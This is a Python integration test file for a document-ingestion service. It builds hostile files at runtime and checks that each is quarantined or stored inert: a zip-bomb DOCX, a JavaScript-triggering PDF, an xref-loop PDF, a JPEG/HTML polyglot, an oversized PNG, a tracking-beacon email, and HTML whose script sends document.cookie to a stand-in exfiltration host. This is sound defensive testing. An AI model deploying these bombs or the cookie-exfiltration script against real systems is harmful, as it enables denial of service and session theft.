"""Hostile files through the real pipeline: each is quarantined or stored inert, never a crash.

The corpus is generated here rather than committed, so the public repository carries no
weaponised binaries. Needs `make test-integration` (PostgreSQL, Gotenberg) and Tesseract.
"""

import shutil
import struct
import zipfile
import zlib
from email.message import EmailMessage
from io import BytesIO

import pikepdf
import pytest
from docuhive import ingest, vault
from PIL import Image

from .test_document_core_integration import ingest_file, owner, row  # noqa: F401

pytestmark = [
    pytest.mark.integration,
    pytest.mark.skipif(not shutil.which("tesseract"), reason="Tesseract is not installed"),
]


def zip_bomb_docx() -> bytes:
    stream = BytesIO()
    with zipfile.ZipFile(stream, "w", zipfile.ZIP_DEFLATED, compresslevel=1) as archive:
        archive.writestr("[Content_Types].xml", "<Types/>")
        with archive.open("word/document.xml", "w", force_zip64=True) as entry:
            for _ in range(520):  # 520 MB of zeros, a few hundred KB on disk
                entry.write(bytes(1 << 20))
    return stream.getvalue()


def pdf_with_javascript() -> bytes:
    stream = BytesIO()
    with pikepdf.new() as pdf:
        pdf.add_blank_page()
        action = pdf.make_indirect(
            pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS=pikepdf.String("app.alert(1)"))
        )
        pdf.Root.OpenAction = action
        pdf.Root.Names = pikepdf.Dictionary(
            JavaScript=pikepdf.Dictionary(Names=pikepdf.Array([pikepdf.String("x"), action]))
        )
        pdf.save(stream)
    return stream.getvalue()


def pdf_with_xref_loop() -> bytes:
    body = (
        b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
        b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
        b"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]>>endobj\n"
    )
    xref = len(body)
    # /Prev points back at this same xref section: a naive reader loops forever.
    return body + (
        b"xref\n0 1\n0000000000 65535 f \ntrailer<</Size 4/Root 1 0 R/Prev %d>>\n"
        b"startxref\n%d\n%%%%EOF\n" % (xref, xref)
    )


def jpeg_html_polyglot() -> bytes:
    stream = BytesIO()
    Image.new("RGB", (64, 64), "white").save(stream, "JPEG")
    return stream.getvalue() + b"<html><script>alert(document.cookie)</script></html>"


def png_50k_square() -> bytes:
    def chunk(kind: bytes, data: bytes) -> bytes:
        return (
            struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data))
        )

    header = struct.pack(">IIBBBBB", 50_000, 50_000, 1, 0, 0, 0, 0)
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", header)
        + chunk(b"IDAT", zlib.compress(b"\x00" * 6251))
        + chunk(b"IEND", b"")
    )


def eml_with_beacon() -> bytes:
    message = EmailMessage()
    message["From"] = "sender@example.invalid"
    message["To"] = "owner@example.invalid"
    message["Subject"] = "Synthetic newsletter"
    message.set_content("Plain part")
    message.add_alternative(
        '<html><body><p>Hello</p><img src="http://beacon.example.invalid/open.gif"></body></html>',
        subtype="html",
    )
    return message.as_bytes()


def html_with_script() -> bytes:
    return (
        b"<!doctype html><html><body><p>Synthetic page</p>"
        b"<script>fetch('http://exfil.example.invalid/'+document.cookie)</script>"
        b'<iframe src="http://frame.example.invalid/"></iframe></body></html>'
    )


ACTIVE_KEYS = {"/JS", "/JavaScript", "/OpenAction", "/AA", "/URI", "/Launch", "/EmbeddedFiles"}
ACTIVE_ACTIONS = {"/JavaScript", "/Launch", "/URI", "/SubmitForm", "/ImportData", "/GoToR"}


def active_content(data: bytes) -> list[str]:
    """Every action, script or remote link in the decoded objects, object streams included."""
    found = []
    with pikepdf.open(BytesIO(data)) as pdf:
        for obj in pdf.objects:
            if not isinstance(obj, (pikepdf.Dictionary, pikepdf.Stream)):
                continue
            keys = set(obj.keys())
            found += sorted(keys & ACTIVE_KEYS)
            if str(obj.get("/S", "")) in ACTIVE_ACTIONS:
                found.append(str(obj["/S"]))
    return found


def test_inertness_check_sees_actions_inside_compressed_object_streams():
    stream = BytesIO()
    with pikepdf.open(BytesIO(pdf_with_javascript())) as pdf:
        pdf.save(
            stream, object_stream_mode=pikepdf.ObjectStreamMode.generate, compress_streams=True
        )
    data = stream.getvalue()
    assert b"/JavaScript" not in data  # hidden from a raw byte search
    assert "/OpenAction" in active_content(data)
    assert "/JavaScript" in active_content(data)


CORPUS = {
    "bomb.docx": zip_bomb_docx,
    "script.pdf": pdf_with_javascript,
    "xref-loop.pdf": pdf_with_xref_loop,
    "polyglot.jpg": jpeg_html_polyglot,
    "huge.png": png_50k_square,
    "beacon.eml": eml_with_beacon,
    "script.html": html_with_script,
}


@pytest.mark.req("ING-04", "NFR-02")
@pytest.mark.parametrize("name", sorted(CORPUS))
def test_hostile_file_is_quarantined_or_stored_inert(owner, name):  # noqa: F811
    try:
        doc_id = ingest_file(owner, name, CORPUS[name]())  # any other raise = a worker crash
    except ingest.UnsupportedType:
        assert name == "bomb.docx"  # refused at submission, before anything is stored
        return
    status, reason, _ = row(doc_id)
    assert status in {"stored", "quarantined"}, (status, reason)
    if status == "stored":
        archive = (next(vault.root().glob(f"*/{doc_id}")) / "archive.pdf").read_bytes()
        assert active_content(archive) == []
